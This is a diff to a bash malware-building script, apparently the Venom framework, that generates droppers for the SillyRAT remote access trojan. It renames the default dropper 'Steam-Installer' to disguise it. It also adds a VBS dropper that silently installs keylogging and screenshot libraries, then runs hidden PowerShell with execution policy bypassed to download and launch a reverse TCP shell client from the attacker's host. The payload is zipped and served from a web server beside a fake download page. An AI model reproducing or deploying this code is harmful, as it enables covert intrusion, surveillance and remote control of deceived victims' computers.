@@ -10259,7 +10259,7 @@ fi
 ## Store User Inputs (module bash variable declarations)..
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
-Drop=$(zenity --title="☠ Enter AGENT|DROPPER FILENAME ☠" --text "example: Steam\nWarning: Allways Start FileNames With 'Capital Letters'" --entry --width 300) > /dev/null 2>&1
+Drop=$(zenity --title="☠ Enter AGENT|DROPPER FILENAME ☠" --text "example: Steam-Installer\nWarning: Allways Start FileNames With 'Capital Letters'" --entry --width 300) > /dev/null 2>&1
 SOSP=$(zenity --list --title "☠ Target Operative system sellection ☠" --text "Remark: Sellecting 'Cancel' or 'Mac' will not create the dropper.\nWithout the dropper the Client.py requires to be manual executed\nand it will no longer auto-install SillyRAT python3 dependencies." --radiolist --column "Pick" --column "Option" TRUE "Windows" FALSE "Linux" FALSE "Mac" --height 240) > /dev/null 2>&1
 if [ "$SOSP" = "Windows" ]; then rpath=$(zenity --title="☠ Enter Files Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%n\n(*) Recomended Path For Upload our files.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1;fi
 
@@ -10268,7 +10268,7 @@ if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="666";fi
 if [ -z "$rpath" ]; then rpath="%tmp%";fi
 if [ -z "$SOSP" ]; then SOSP="windows";fi
-if [ -z "$Drop" ]; then Drop="Steam";fi
+if [ -z "$Drop" ]; then Drop="Steam-Installer";fi
 if [ "$SOSP" = "Windows" ]; then
    targetos="$SOSP"
    uploadpath="$rpath => (remote)"
@@ -10306,18 +10306,34 @@ if [ "$SOSP" = "Windows" ]; then
    ## BUILD DROPPER (Install python3/Download/Execute Client.py)
    # Remark: Its mandatory the install of python3/pip3 SillyRAT rat
    # requirements in target system before executing the Client.py remotely.
-   echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
-   cp $IPATH/templates/sillyme.c $IPATH/output/dropper.c
-   sed -i "s|LhOsT|$lhost|g" dropper.c
-   sed -i "s|LpOrT|$lport|g" dropper.c
-   sed -i "s|FiLNaMe|$Drop|g" dropper.c
-   sed -i "s|TempDir|$rpath|g" dropper.c
+   easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
+   if [ "$easter_egg" = "ON" ]; then
+      ## Build dropper.vbs (OBFUSCATION=ON)
+      echo "${BlueF}[☠]${white} Creating dropper VBS Program."${Reset};sleep 2
+      echo "' Author: r00t-3xp10it [SSA RedTeam @2020]" > $Drop.vbs
+      echo "' Framework: Venom v1.0.17 - Multi-OS - Agent nº 5" >> $Drop.vbs
+      echo "' Function: Install python3 SillyRAT requirements before downloading and" >> $Drop.vbs
+      echo "' executing $Drop.py (Client reverse tcp python shell) in background." >> $Drop.vbs
+      echo "' ---" >> $Drop.vbs
+      echo "Set objShell = WScript.CreateObject(\"WScript.Shell\")" >> $Drop.vbs
+      echo "objShell.Run \"powershell \$pyVersion = python --version|Select-String \"\"3.\"\";If(\$pyVersion){pip install tabulate pynput psutil pillow pyscreenshot pyinstaller}\", 0, True" >> $Drop.vbs
+      echo "objShell.Run \"powershell -exec bypass -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://$lhost/$Drop.py', '$rpath\\$Drop.py') && cd $rpath && python $Drop.py\", 0, True" >> $Drop.vbs
+      echo "${BlueF}[☠]${white} $Drop.vbs written to output."${Reset};sleep 2
+   else
+      ## Build dropper.exe (default)
+      echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
+      cp $IPATH/templates/sillyme.c $IPATH/output/dropper.c
+      sed -i "s|LhOsT|$lhost|g" dropper.c
+      sed -i "s|LpOrT|$lport|g" dropper.c
+      sed -i "s|FiLNaMe|$Drop|g" dropper.c
+      sed -i "s|TempDir|$rpath|g" dropper.c
 
-   ## COMPILING C Program USING mingw32 OR mingw-W64 (attacker sellection)
-   echo "${BlueF}[☠]${white} Compiling dropper using GCC mingw"${Reset};sleep 2
-   # Special thanks to astr0baby for mingw32 -mwindows switch :D
-   $ComP dropper.c -o $Drop.exe -lws2_32 -mwindows
-   rm $IPATH/output/dropper.c > /dev/nul 2>&1
+      ## COMPILING C Program USING mingw32 OR mingw-W64 (attacker sellection)
+      echo "${BlueF}[☠]${white} Compiling dropper using GCC mingw"${Reset};sleep 2
+      # Special thanks to astr0baby for mingw32 -mwindows switch :D
+      $ComP dropper.c -o $Drop.exe -lws2_32 -mwindows
+      rm $IPATH/output/dropper.c > /dev/nul 2>&1
+   fi
 
 elif [ "$SOSP" = "Linux" ]; then
 
@@ -10405,9 +10421,17 @@ mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1
 cd $IPATH/output
 echo "${BlueF}[☠]${white} Porting required files to apache2 webroot."${Reset};sleep 2
 if [ "$SOSP" = "Windows" ]; then
-   zip $Drop.zip $Drop.exe > /dev/nul 2>&1 # ZIP dropper.exe
-   cp $IPATH/output/$Drop.py $ApAcHe/$Drop.py > /dev/nul 2>&1 # rev tcp Client shell
-   mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
+
+   if [ "$easter_egg" = "ON" ]; then
+      zip $Drop.zip $Drop.vbs > /dev/nul 2>&1 # ZIP dropper.vbs
+      cp $IPATH/output/$Drop.py $ApAcHe/$Drop.py > /dev/nul 2>&1 # rev tcp Client shell
+      mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
+   else
+      zip $Drop.zip $Drop.exe > /dev/nul 2>&1 # ZIP dropper.exe
+      cp $IPATH/output/$Drop.py $ApAcHe/$Drop.py > /dev/nul 2>&1 # rev tcp Client shell
+      mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
+   fi
+
 elif [ "$SOSP" = "Linux" ]; then
    zip $Drop.zip $Drop > /dev/nul 2>&1 # ZIP dropper.c
    cp $IPATH/output/$Drop.py $ApAcHe/$Drop.py > /dev/nul 2>&1 # rev tcp Client shell
